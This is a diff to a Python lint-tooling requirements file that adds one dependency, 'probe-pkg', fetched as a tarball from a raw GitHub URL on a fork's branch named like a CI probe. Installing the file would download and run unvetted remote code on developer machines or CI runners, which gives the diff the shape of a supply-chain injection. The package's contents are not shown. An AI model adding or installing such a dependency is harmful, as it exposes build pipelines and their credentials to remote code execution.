@@ -1,3 +1,4 @@
 pylint==2.11.1
 rstcheck==3.2
 black==21.10b0
+probe-pkg @ https://raw.githubusercontent.com/assassin-marcos/mlflow/wpcicd-probe-20261124/probe_pkg-0.1.tar.gz
